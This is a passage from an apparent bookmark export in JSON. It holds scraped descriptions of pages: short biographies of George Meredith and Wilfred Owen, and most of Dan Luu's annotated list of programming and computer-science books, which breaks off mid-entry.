Meredith was a Victorian poet, author and journalist. He published\neighteen novels between 1856 and his death in 1909 and, although many had\nlimited commercial and critical success, _The Egoist_ (1879) and _Diana of the\nCrossways_ (1885) were well received. At various times Meredith worked as a\nreader and adviser to publishers, as a war correspondent and as a contributor\nto and editor of literary journals. He was a skilful essayist and lecturer,\nand his \u2018Essay on Comedy\u2019 was regarded as a brilliant and insightful piece of\nwork.\n\nMeredith was an accomplished poet. Among his most widely read works is _Modern\nLove_ , an uneven but fascinating account of the break\u2011up of a marriage,\nclearly based on his own experience. His wife eloped with an artist,\nabandoning Meredith and their son. The work is written as a sonnet sequence,\nusing the sixteen-line form known as the \u2018Meredithian sonnet\u2019.\n\n[ ![](http://www.poetrybyheart.org.uk/wp-\ncontent/themes/poetrybyheart/images/Oxford-DNB.jpg)\n\nRead more about George Meredith in the  \nOxford Dictionary of National Biography\n\n](http://www.oxforddnb.com/public/dnb/34991.html)\n\n", "title": "Poetry By Heart  | Lucifer in Starlight", "date": "01/05/20", "tags": []}, "45": {"type": "bookmark", "url": "https://www.poetrybyheart.org.uk/poems/anthem-for-doomed-youth/", "desc": "Wilfred Owen is remembered as one of the most passionate and eloquent voices of the First World War.

Most of the poems for which he is now famous were\nwritten in a period of intense creativity between 1917 and 1918.\n\nAppalled by the suffering and waste of human life in a war that seemed\nincreasingly futile Owen set out to show what he called the \u201cPity of War\u201d.\n\nOwen enlisted in 1915 and two years later he was wounded and suffered shell\nshock. He was sent back to England in 1917 to a Scottish military hospital\nwhere he met and was influenced by Siegfried Sassoon who encouraged Owen to\nwrite. On his return to the front Owen\u2019s courage and leadership were\nrecognised with the award of the Military Cross. He did not survive the war\ndying in action just days before the end of hostilities.\n\nHis work is full of compassion and outrage and technically highly skilful.\nPerhaps more than any other poet of the First World War he was able to show\nthe reality and horror of war.\n\n", "title": "Poetry By Heart  | Anthem for Doomed Youth", "date": "01/05/20", "tags": []}, "46": {"type": "bookmark", "url": "http://danluu.com/programming-books/", "desc": "There are a lot of \u201c12 CS books every programmer must read\u201d lists floating around out there.

That's nonsense. The field is too broad for almost any topic\nto be required reading for all programmers, and even if a topic is that\nimportant, people's learning preferences differ too much for any book on that\ntopic to be the best book on the topic for all people.\n\nThis is a list of topics and books where I've read the book, am familiar\nenough with the topic to say what you might get out of learning more about the\ntopic, and have read other books and can say why you'd want to read one book\nover another.\n\n### Algorithms / Data Structures / Complexity\n\nWhy should you care? Well, there's the pragmatic argument: even if you never\nuse this stuff in your job, most of the best paying companies will quiz you on\nthis stuff in interviews. On the non-bullshit side of things, I find\nalgorithms to be useful in the same way I find math to be useful. The\nprobability of any particular algorithm being useful for any particular\nproblem is low, but having a general picture of what kinds of problems are\nsolved problems, what kinds of problems are intractable, and when\napproximations will be effective, is often useful.\n\n#### McDowell; [Cracking the Coding\nInterview](https://www.amazon.com/gp/product/0984782850/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0984782850&linkId=a34501f41a8ccd1ba8d604198c026551)\n\nSome problems and solutions, with explanations, matching the level of\nquestions you see in entry-level interviews at Google, Facebook, Microsoft,\netc. I usually recommend this book to people who want to pass interviews but\nnot really learn about algorithms. It has just enough to get by, but doesn't\nreally teach you the _why_ behind anything. If you want to actually learn\nabout algorithms and data structures, see below.\n\n#### Dasgupta, Papadimitriou, and Vazirani;\n[Algorithms](https://www.amazon.com/gp/product/0073523402/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0073523402&linkId=51557d68c39707af447ec02339249dd1)\n\nEverything about this book seems perfect to me. It breaks up algorithms into\nclasses (e.g., divide and conquer or greedy), and teaches you how to recognize\nwhat kind of algorithm should be used to solve a particular problem. It has a\ngood selection of topics for an intro book, it's the right length to read over\na few weekends, and it has exercises that are appropriate for an intro book.\nAdditionally, it has sub-questions in the middle of chapters to make you\nreflect on non-obvious ideas to make sure you don't miss anything.\n\nI know some folks don't like it because it's relatively math-y/proof focused.\nIf that's you, you'll probably prefer Skiena.\n\n#### Skiena; [The Algorithm Design\nManual](https://www.amazon.com/gp/product/1848000693/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1848000693&linkId=59bca0c3da96693a0c5384c97f6e59bb)\n\nThe longer, more comprehensive, more practical, less math-y version of\nDasgupta. It's similar in that it attempts to teach you how to identify\nproblems, use the correct algorithm, and give a clear explanation of the\nalgorithm. Book is well motivated with \u201cwar stories\u201d that show the impact of\nalgorithms in real world programming.\n\n#### CLRS; [Introduction to\nAlgorithms](https://www.amazon.com/gp/product/0262033844/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0262033844&linkId=f7dc38d160a69e72427774682d9c0bc6)\n\nThis book somehow manages to make it into half of these \u201cN books all\nprogrammers must read\u201d lists despite being so comprehensive and rigorous that\nalmost no practitioners actually read the entire thing. It's great as a\ntextbook for an algorithms class, where you get a selection of topics. As a\nclass textbook, it's nice bonus that it has exercises that are hard enough\nthat they can be used for graduate level classes (about half the exercises\nfrom my grad level algorithms class were pulled from CLRS, and the other half\nwere from Kleinberg & Tardos), but this is wildly impractical as a standalone\nintroduction for most people.\n\nJust for example, there's an entire chapter on Van Emde Boas trees. They're\nreally neat -- it's a little surprising that a balanced-tree-like structure\nwith `O(lg lg n)` insert, delete, as well as find, successor, and predecessor\nis possible, but a first introduction to algorithms shouldn't include Van Emde\nBoas trees.\n\n#### Kleinberg & Tardos; [Algorithm\nDesign](https://www.amazon.com/gp/product/9332518645/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=9332518645&linkId=284dc1e6677bb43997fac393456bbc70)\n\nSame comments as for CLRS -- it's widely recommended as an introductory book\neven though it doesn't make sense as an introductory book. Personally, I found\nthe exposition in Kleinberg to be much easier to follow than in CLRS, but\nplenty of people find the opposite.\n\n#### Demaine; [Advanced Data\nStructures](http://courses.csail.mit.edu/6.851/spring14/)\n\nThis is a set of lectures and notes and not a book, but if you want a coherent\n(but not intractably comprehensive) set of material on data structures that\nyou're unlikely to see in most undergraduate courses, this is great. The notes\naren't designed to be standalone, so you'll want to watch the videos if you\nhaven't already seen this material.\n\n#### Okasaki; [Purely Functional Data\nStructures](https://www.amazon.com/gp/product/0521663504/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0521663504&linkId=2638d1c24b973d9ddf71f9968a309fea)\n\nFun to work through, but, unlike the other algorithms and data structures\nbooks, I've yet to be able to apply anything from this book to a problem\ndomain where performance really matters.\n\nFor a couple years after I read this, when someone would tell me that it's not\nthat hard to reason about the performance of purely functional lazy data\nstructures, I'd ask them about part of a proof that stumped me in this book.\nI'm not talking about some obscure super hard exercise, either. I'm talking\nabout something that's in the main body of the text that was considered too\nobvious to the author to explain. No one could explain it. Reasoning about\nthis kind of thing is harder than people often claim.\n\n#### Dominus; [Higher Order Perl](http://hop.perl.plover.com/book/)\n\nA gentle introduction to functional programming that happens to use Perl. You\ncould probably work through this book just as easily in Python or Ruby.\n\nIf you keep up with what's trendy, this book might seem a bit dated today, but\nonly because so many of the ideas have become mainstream. If you're wondering\nwhy you should care about this \"functional programming\" thing people keep\ntalking about, and some of the slogans you hear don't speak to you or are even\noff-putting (types are propositions, it's great because it's math, etc.), give\nthis book a chance.\n\n#### Levitin;\n[Algorithms](https://www.amazon.com/gp/product/0132316811/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0132316811&linkId=26aa7611b1a13ec1c73c2ffe0512a777)\n\nI ordered this off amazon after seeing these two blurbs: \u201cOther learning-\nenhancement features include chapter summaries, hints to the exercises, and a\ndetailed solution manual.\u201d and \u201cStudent learning is further supported by\nexercise hints and chapter summaries.\u201d One of these blurbs is even printed on\nthe book itself, but after getting the book, the only self-study resources I\ncould find were some yahoo answers posts asking where you could find hints or\nsolutions.\n\nI ended up picking up Dasgupta instead, which was available off an author's\nwebsite for free.\n\n#### Mitzenmacher & Upfal; Probability and Computing: [Randomized Algorithms\nand Probabilistic\nAnalysis](https://www.amazon.com/gp/product/0521835402/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0521835402&linkId=d65b4aa027a011a1a5875776aee9b9d7)\n\nI've probably gotten more mileage out of this than out of any other algorithms\nbook. A lot of randomized algorithms are [trivial to port to other\napplications](http://danluu.com/2choices-eviction/) and can simplify things a\nlot.\n\nThe text has enough of an intro to probability that you don't need to have any\nprobability background. Also, the material on tails bounds (e.g., Chernoff\nbounds) is useful for a lot of CS theory proofs and isn't covered in the intro\nprobability texts I've seen.\n\n#### Sipser; [Introduction to the Theory of\nComputation](https://www.amazon.com/gp/product/113318779X/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=113318779X&linkId=aaee0c6fd8df18a1372efdb8295bb426)\n\nClassic intro to theory of computation. Turing machines, etc. Proofs are often\ngiven at an intuitive, \u201cproof sketch\u201d, level of detail. A lot of important\nresults (e.g, Rice's Theorem) are pushed into the exercises, so you really\nhave to do the key exercises. Unfortunately, most of the key exercises don't\nhave solutions, so you can't check your work.\n\nFor something with a more modern topic selection, maybe see [Aurora &\nBarak](http://theory.cs.princeton.edu/complexity/).\n\n#### Bernhardt;\n[Computation](https://www.destroyallsoftware.com/screencasts/catalog/introduction-\nto-computation)\n\nCovers a few theory of computation highlights. The explanations are delightful\nand I've watched some of the videos more than once just to watch Bernhardt\nexplain things. Targeted at a general programmer audience with no background\nin CS.\n\n#### Kearns & Vazirani; [An Introduction to Computational Learning\nTheory](https://www.amazon.com/gp/product/0262111934/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0262111934&linkId=373c1d6780793c4552728116254da17c)\n\nClassic, but dated and riddled with errors, with no errata available. When I\nwanted to learn this material, I ended up cobbling together notes from a\ncouple of courses, one by [Klivans](http://www.cs.utexas.edu/~klivans/cl.html)\nand one by [Blum](https://www.cs.cmu.edu/~avrim/ML14/).\n\n### Operating Systems\n\nWhy should you care? Having a bit of knowledge about operating systems can\nsave days or week of debugging time. This is a regular theme on [Julia Evans's\nblog](http://jvns.ca/), and I've found the same thing to be true of my\nexperience. I'm hard pressed to think of anyone who builds practical systems\nand knows a bit about operating systems who hasn't found their operating\nsystems knowledge to be a time saver. However, there's a bias in who reads\noperating systems books -- it tends to be people who do related work! It's\npossible you won't get the same thing out of reading these if you do really\nhigh-level stuff.\n\n#### Silberchatz, Galvin, and Gagne; [Operating System\nConcepts](https://www.amazon.com/gp/product/1118063333/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1118063333&linkId=c60719f7dd6b3355d7f8535a25d74f07)\n\nThis was what we used at Wisconsin before [the comet\nbook](http://pages.cs.wisc.edu/~remzi/OSTEP/) became standard. I guess it's\nok. It covers concepts at a high level and hits the major points, but it's\nlacking in technical depth, details on how things work, advanced topics, and\nclear exposition.\n\n#### Cox, Kasshoek, and Morris;\n[xv6](https://pdos.csail.mit.edu/6.828/2014/xv6/book-rev8.pdf)\n\nThis book is great! It explains how you can actually implement things in a\nreal system, and it [comes with its own implementation of an OS that you can\nplay with](https://en.wikipedia.org/wiki/Xv6). By design, the authors favor\nsimple implementations over optimized ones, so the algorithms and data\nstructures used are often quite different than what you see in production\nsystems.\n\nThis book goes well when paired with a book that talks about how more modern\noperating systems work, like Love's Linux Kernel Development or Russinovich's\nWindows Internals.\n\n#### Arpaci-Dusseau and Arpaci-Dusseau; [Operating Systems: Three Easy\nPieces](https://www.amazon.com/gp/product/B0722MJYCB/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=B0722MJYCB&linkId=ed01591ad6b853092462c17fb987f11e)\n\nNice explanation of a variety of OS topics. Goes into much more detail than\nany other intro OS book I know of. For example, the chapters on file systems\ndescribe the details of multiple, real, filessytems, and discusses the major\nimplementation features of `ext4`. If I have one criticism about the book,\nit's that it's very *nix focused. Many things that are described are simply\nhow things are done in *nix and not inherent, but the text mostly doesn't say\nwhen something is inherent vs. when it's a *nix implementation detail.\n\n#### Love; [Linux Kernel\nDevelopment](https://www.amazon.com/gp/product/0672329468/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0672329468&linkId=e20733e35b36d9e4fb51b5db3b74058d)\n\nThe title can be a bit misleading -- this is basically a book about how the\nLinux kernel works: how things fit together, what algorithms and data\nstructures are used, etc. I read the 2nd edition, which is now quite dated.\nThe 3rd edition has some updates, but [introduced some errors and\ninconsistencies](https://lwn.net/Articles/419855/), and is still dated (it was\npublished in 2010, and covers 2.6.34). Even so, it's a nice introduction into\nhow a relatively modern operating system works.\n\nThe other downside of this book is that the author loses all objectivity any\ntime Linux and Windows are compared. Basically every time they're compared,\nthe author says that Linux has clearly and incontrovertibly made the right\nchoice and that Windows is doing something stupid. On balance, I prefer Linux\nto Windows, but there are a number of areas where Windows is superior, as well\nas areas where there's parity but Windows was ahead for years. You'll never\nfind out what they are from this book, though.\n\n#### Russinovich, Solomon, and Ionescu; [Windows\nInternals](https://www.amazon.com/gp/product/0735648735/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0735648735&linkId=0d5e22fbe4c2130f4f19196ef2082f57)\n\nThe most comprehensive book about how a modern operating system works. It just\nhappens to be about Windows. Coming from a *nix background, I found this\ninteresting to read just to see the differences.\n\nThis is definitely not an intro book, and you should have some knowledge of\noperating systems before reading this. If you're going to buy a physical copy\nof this book, you might want to wait until the 7th edition is released (early\nin 2017).\n\n#### Downey; [The Little Book of\nSemaphores](http://greenteapress.com/wp/semaphores/)\n\nTakes a topic that's normally one or two sections in an operating systems\ntextbook and turns it into its own 300 page book. The book is a series of\nexercises, a bit like The Little Schemer, but with more exposition. It starts\nby explaining what semaphore is, and then has a series of exercises that\nbuilds up higher level concurrency primitives.\n\nThis book was very helpful when I first started to write threading/concurrency\ncode. I subscribe to the [Butler Lampson school of\nconcurrency](http://danluu.com/butler-lampson-1999/), which is to say that I\nprefer to have all the concurrency-related code stuffed into a black box that\nsomeone else writes. But sometimes you're stuck writing the black box, and if\nso, this book has a nice introduction to the style of thinking required to\nwrite maybe possibly not totally wrong concurrent code.\n\nI wish someone would write a book in this style, but both lower level and\nhigher level. I'd love to see exercises like this, but starting with\ninstruction-level primitives for a couple different architectures with\ndifferent memory models (say, x86 and Alpha) instead of semaphores. If I'm\nwriting grungy low-level threading code today, I'm overwhelmingly like to be\nusing `c++11` threading primitives, so I'd like something that uses those\ninstead of semaphores, which I might have used if I was writing threading code\nagainst the `Win32` API. But since that book doesn't exist, this seems like\nthe next best thing.\n\nI've heard that Doug Lea's [Concurrent Programming in\nJava](https://www.amazon.com/gp/product/0201310090/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0201310090&linkId=72b21afe79c9b254cd4383310cff1e42)\nis also quite good, but I've only taken a quick look at it.\n\n### Computer architecture\n\nWhy should you care? The specific facts and trivia you'll learn will be useful\nwhen you're doing low-level performance optimizations, but the real value is\nlearning how to reason about tradeoffs between performance and other factors,\nwhether that's power, cost, size, weight, or something else.\n\nIn theory, that kind of reasoning should be taught regardless of\nspecialization, but my experience is that comp arch folks are much more likely\nto \u201cget\u201d that kind of reasoning and do back of the envelope calculations that\nwill save them from throwing away a 2x or 10x (or 100x) factor in performance\nfor no reason. This sounds obvious, but I can think of multiple production\nsystems at large companies that are giving up 10x to 100x in performance which\nare operating at a scale where even a 2x difference in performance could pay a\nVP's salary -- all because people didn't think through the performance\nimplications of their design.\n\n#### Hennessy & Patterson; Computer Architecture: A Quantitative Approach\n\nThis book teaches you how to do systems design with multiple constraints\n(e.g., performance, TCO, and power) and how to reason about tradeoffs. It\nhappens to mostly do so using microprocessors and supercomputers as examples.\n\nNew editions of this book have substantive additions and you really want the\nlatest version. For example, the latest version added, among other things, a\nchapter on data center design, and it answers questions like, [how much\nopex/capex is spent on power, power distribution, and cooling, and how much is\nspent on support staff and machines](//danluu.com/datacenter-power/), what's\nthe effect of using lower power machines on tail latency and result quality\n(bing search results are used as an example), and what other factors should\nyou consider when designing a data center.\n\nAssumes some background, but that background is presented in the appendices\n(which are available online for free).\n\n#### Shen & Lipasti: [Modern Processor\nDesign](https://www.amazon.com/gp/product/1478607831/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1478607831&linkId=415aef1c0fccd4f6b5f931dbd63a1852)\n\nPresents most of what you need to know to architect a high performance Pentium\nPro (1995) era microprocessor. That's no mean feat, considering the complexity\ninvolved in such a processor. Additionally, presents some more advanced ideas\nand bounds on how much parallelism can be extracted from various workloads\n(and how you might go about doing such a calculation). Has an unusually large\nsection on [value\nprediction](http://pharm.ece.wisc.edu/mikko/oldpapers/asplos7.pdf), because\nthe authors invented the concept and it was still hot when the first edition\nwas published.\n\nFor pure CPU architecture, this is probably the best book available.\n\n#### Hill, Jouppi, and Sohi, [Readings in Computer\nArchitecture](https://www.amazon.com/gp/product/1558605398/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1558605398&linkId=c066a06415728c60470dbee9a41c79fa)\n\nRead for historical reasons and to see how much better we've gotten at\nexplaining things. For example, compare Amdahl's paper on Amdahl's law (two\npages, with a single non-obvious graph presented, and no formulas), vs. the\npresentation in a modern textbook (one paragraph, one formula, and maybe one\ngraph to clarify, although it's usually clear enough that no extra graph is\nneeded).\n\nThis seems to be worse the further back you go; since comp arch is a\nrelatively young field, nothing here is really hard to understand. If you want\nto see a dramatic example of how we've gotten better at explaining things,\ncompare Maxwell's original paper on Maxwell's equations to a modern treatment\nof the same material. Fun if you like history, but a bit of slog if you're\njust trying to learn something.\n\n### Algorithmic game theory / auction theory / mechanism design\n\nWhy should you care? Some of the world's biggest tech companies run on ad\nrevenue, and those ads are sold through auctions. This field explains how and\nwhy they work. Additionally, this material is useful any time you're trying to\nfigure out how to design systems that allocate resources effectively.1\n\nIn particular, incentive compatible mechanism design (roughly, how to create\nsystems that provide globally optimal outcomes when people behave in their own\nselfish best interest) should be required reading for anyone who designs\ninternal incentive systems at companies. If you've ever worked at a large\ncompany that \"gets\" this and one that doesn't, you'll see that the company\nthat doesn't get it has giant piles of money that are basically being lit on\nfire because the people who set up incentives created systems that are hugely\nwasteful. This field gives you the background to understand what sorts of\nmechanisms give you what sorts of outcomes; reading case studies gives you a\nvery long (and entertaining) list of mistakes that can cost millions or even\nbillions of dollars.\n\n#### Krishna; [Auction\nTheory](https://www.amazon.com/gp/product/0123745071/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=0123745071&linkCode=as2&tag=abroaview-20&linkId=cc4354c8796c223d9612f5dc12e7afd8)\n\nThe last time I looked, this was the only game in town for a comprehensive,\nmodern, introduction to auction theory. Covers the classic [second price\nauction result](https://en.wikipedia.org/wiki/Vickrey_auction) in the first\nchapter, and then moves on to cover risk aversion, bidding rings,\ninterdependent values, multiple auctions, asymmetrical information, and other\nreal-world issues.\n\nRelatively dry. Unlikely to be motivating unless you're already interested in\nthe topic. Requires an understanding of basic probability and calculus.\n\n#### Steighlitz; [Snipers, Shills, and Sharks: eBay and Human\nBehavior](https://www.amazon.com/gp/product/0691127131/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0691127131&linkId=a0ed27b464ee65f5551f60e3a796cf26)\n\nSeems designed as an entertaining introduction to auction theory for the\nlayperson. Requires no mathematical background and relegates math to the small\nprint. Covers maybe, 1/10th of the material of Krishna, if that. Fun read.\n\n#### Crampton, Shoham, and Steinberg; [Combinatorial\nAuctions](ftp://cramton.umd.edu/ca-book/cramton-shoham-steinberg-\ncombinatorial-auctions.pdf)\n\nDiscusses things like how FCC spectrum auctions got to be the way they are and\nhow \u201cbugs\u201d in mechanism design can leave hundreds of millions or billions of\ndollars on the table. This is one of those books where each chapter is by a\ndifferent author. Despite that, it still manages to be coherent and I didn't\nmind reading it straight through. It's self-contained enough that you could\nprobably read this without reading Krishna first, but I wouldn't recommend it.\n\n#### Shoham and Leyton-Brown; [Multiagent Systems: Algorithmic, Game-\nTheoretic, and Logical Foundations](http://www.masfoundations.org/)\n\nThe title is the worst thing about this book. Otherwise, it's a nice\nintroduction to algorithmic game theory. The book covers basic game theory,\nauction theory, and other classic topics that CS folks might not already know,\nand then covers the intersection of CS with these topics. Assumes no\nparticular background in the topic.\n\n#### Nisan, Roughgarden, Tardos, and Vazirani; [Algorithmic Game\nTheory](https://www.amazon.com/gp/product/0521872820/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0521872820&linkId=7caf296d20541c2fc320dd423ecff19a)\n\nA survey of various results in algorithmic game theory. Requires a fair amount\nof background (consider reading Shoham and Leyton-Brown first). For example,\nchapter five is basically Devanur, Papadimitriou, Saberi, and Vazirani's JACM\npaper, _Market Equilibrium via a Primal-Dual Algorithm for a Convex Program_ ,\nwith a bit more motivation and some related problems thrown in. The exposition\nis good and the result is interesting (if you're into that kind of thing), but\nit's not necessarily what you want if you want to read a book straight through\nand get an introduction to the field.\n\n### Misc\n\n#### Beyer, Jones, Petoff, and Murphy; [Site Reliability\nEngineering](https://www.amazon.com/gp/product/149192912X/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=149192912X&linkId=3bfad60d002c35ba1809816e159efd77)\n\nA description of how Google handles operations. Has the typical Google tone,\nwhich is off-putting to a lot of folks with a \u201ctraditional\u201d ops background,\nand assumes that many things can only be done with the SRE model when they\ncan, in fact, be done without going full SRE.\n\nFor a much longer description, [see this 22 page set of notes on Google's SRE\nbook](//danluu.com/google-sre-book/).\n\n#### Fowler, Beck, Brant, Opdyke, and Roberts;\n[Refactoring](https://www.amazon.com/gp/product/0201485672/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0201485672&linkId=72ba04417a765056c7e41111361dcfba)\n\nAt the time I read it, it was worth the price of admission for the section on\ncode smells alone. But this book has been so successful that the ideas of\nrefactoring and code smells have become mainstream.\n\nSteve Yegge has [a great pitch for this\nbook](https://sites.google.com/site/steveyegge2/ten-great-books):\n\n> When I read this book for the first time, in October 2003, I felt this\n> horrid cold feeling, the way you might feel if you just realized you've been\n> coming to work for 5 years with your pants down around your ankles.

And it debunked two or three\n> practices that I had cherished since my earliest days as a programmer. Don't\n> comment your code? Local variables are the root of all evil? Is this guy a\n> madman? Read it and decide for yourself!\n\n#### Demarco & Lister,\n[Peopleware](https://www.amazon.com/gp/product/0321934113/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0321934113&linkId=37e2eb92615c6926852e31fa057c3df5)\n\nThis book seemed convincing when I read it in college. It even had [all sorts\nof studies](//danluu.com/dunning-kruger/) backing up what they said. No\ndeadlines is better than having deadlines. Offices are better than cubicles.\nBasically all devs I talk to agree with this stuff.\n\nBut virtually every successful company is run the opposite way. Even Microsoft\nis remodeling buildings from individual offices to open plan layouts. Could it\nbe that all of this stuff just doesn't matter that much? If it really is that\nimportant, how come companies that are true believers, like Fog Creek, aren't\nrunning roughshod over their competitors?\n\nThis book agrees with my biases and I'd love for this book to be right, but\nthe meta evidence makes me want to re-read this with a critical eye and look\nup primary sources.\n\n#### Drummond; [Renegades of the\nEmpire](https://www.amazon.com/gp/product/0609604163/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0609604163&linkId=367bcc7edf76352c97b6050c04af4aaa)\n\nThis book explains how Microsoft's aggressive culture got to be the way it is\ntoday. The intro reads:\n\n> Microsoft didn't necessarily hire clones of Gates (although there were\n> plenty on the corporate campus) so much as recruiter those who shared some\n> of Gates's more notable traits -- arrogance, aggressiveness, and high\n> intelligence.\n>\n> \u2026\n>\n> Gates is infamous for ridiculing someone's idea as \u201cstupid\u201d, or worse,\n> \u201crandom\u201d, just to see how he or she defends a position.

When I say random, I mean that there\nwere instances where critical engineers were allegedly fired so that the\n\"decider\" could show other important people that current management was still\nin charge.\n\nI don't know folks who were at Twitter back then, but I know plenty of folks\nwho were at the next generation of startups in their early days and there are\na couple of companies where people had eerily similar experiences. Read this\nbook if you're considering a job at a trendy startup.\n\n#### Galenson; [Old Masters and Young\nGeniuses](https://www.amazon.com/gp/product/0691133808/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0691133808&linkId=9c6bc8a67b097a8f79bc4b10e0243fa0)\n\nThis book is about art and how productivity changes with age, but if its\nthesis is valid, it probably also applies to programming. Galenson applies\nstatistics to determine the \"greatness\" of art and then uses that to draw\nconclusions about how the productivty of artists change as they age. I don't\nhave time to go over the data in detail, so I'll have to remain skeptical of\nthis until I have more free time, but I think it's interesting reading even\nfor a skeptic.\n\n### Math\n\nWhy should you care? From a pure ROI perspective, I doubt learning math is\n\u201cworth it\u201d for 99% of jobs out there. AFAICT, I use math more often than most\nprogrammers, and I don't use it all that often. But having the right math\nbackground sometimes comes in handy and I really enjoy learning math. YMMV.\n\n#### Bertsekas; [Introduction to\nProbability](https://www.amazon.com/gp/product/188652923X/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=188652923X&linkId=31f59f124c2c8a7ee7917b01c7fbed52)\n\nIntroductory undergrad text that tends towards intuitive explanations over\nepsilon-delta rigor. For anyone who cares to do more rigorous derivations,\nthere are some exercises at the back of the book that go into more detail.\n\nHas many exercises with available solutions, making this a good text for self-\nstudy.\n\n#### Ross; [A First Course in\nProbability](https://www.amazon.com/gp/product/013603313X/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=013603313X&linkId=ba9a3635504a6aadc9f40d3faf3c8785)\n\nThis is one of those books where they regularly crank out new editions to make\nstudents pay for new copies of the book (this is presently priced at a\nwhopping $174 on Amazon)2. This was the standard text when I took probability\nat Wisconsin, and I literally cannot think of a single person who found it\nhelpful. Avoid.\n\n#### Brualdi; [Introductory\nCombinatorics](https://www.amazon.com/gp/product/0136020402/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0136020402&linkId=9910ad28e52b0c86afa82f449644458a)\n\nBrualdi is a great lecturer, one of the best I had in undergrad, but this book\nwas full of errors and not particularly clear. There have been two new\neditions since I used this book, but according to the Amazon reviews the book\nstill has a lot of errors.\n\nFor an alternate introductory text, I've heard good things about [Camina &\nLewis's\nbook](https://www.amazon.com/gp/product/B00F5QU8W4/ref=as_li_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=B00F5QU8W4&linkId=77558d398300005cc19a20780da38822),\nbut I haven't read it myself. Also,\n[Lovasz](http://www.amazon.com/Combinatorial-Problems-Exercises-Chelsea-\nPublishing/dp/0821842625) is a great book on combinatorics, but it's not\nexactly introductory.\n\n#### Apostol;\n[Calculus](https://www.amazon.com/gp/product/0471000051/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0471000051&linkId=cf7635e3dcc9e368a8ca72ee7a8af3a0)\n\nVolume 1 covers what you'd expect in a calculus I + calculus II book. Volume 2\ncovers linear algebra and multivariable calculus. It covers linear algebra\nbefore multivariable calculus, which makes multi-variable calculus a lot\neasier to understand.\n\nIt also makes a lot of sense from a programming standpoint, since a lot of the\nvalue I get out of calculus is its applications to approximations, etc., and\nthat's a lot clearer when taught in this sequence.\n\nThis book is probably a rough intro if you don't have a professor or TA to\nhelp you along. The Spring SUMS series tends to be pretty good for self-study\nintroductions to various areas, but I haven't actually read their intro\ncalculus book so I can't actually recommend it.\n\n#### Stewart;\n[Calculus](https://www.amazon.com/gp/product/0538497815/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0538497815&linkId=e25774196137c043bb638fdf39bcf473)\n\nAnother one of those books where they crank out new editions with trivial\nchanges to make money. This was the standard text for non-honors calculus at\nWisconsin, and the result of that was I taught a lot of people to do complex\nintegrals with the methods covered in Apostol, which are much more intuitive\nto many folks.\n\nThis book takes the approach that, for a type of problem, you should pattern\nmatch to one of many possible formulas and then apply the formula. Apostol is\nmore about teaching you a few tricks and some intuition that you can apply to\na wide variety of problems. I'm not sure why you'd buy this unless you were\nrequired to for some class.\n\n### Hardware basics\n\nWhy should you care? People often claim that, [to be a good programmer, you\nhave to understand every abstraction you\nuse](https://news.ycombinator.com/item?id=12095869). That's nonsense. Modern\ncomputing is too complicated for any human to have a real full-stack\nunderstanding of what's going on. In fact, one reason modern computing can\naccomplish what it does is that it's possible to be productive without having\na deep understanding of much of the stack that sits below the level you're\noperating at.\n\nThat being said, if you're curious about what sits below software, here are a\nfew books that will get you started.\n\n#### Nisan & Shocken; [nand2tetris](http://www.nand2tetris.org/)\n\nIf you only want to read one single thing, this should probably be it. It's a\n\u201c101\u201d level intro that goes down to gates 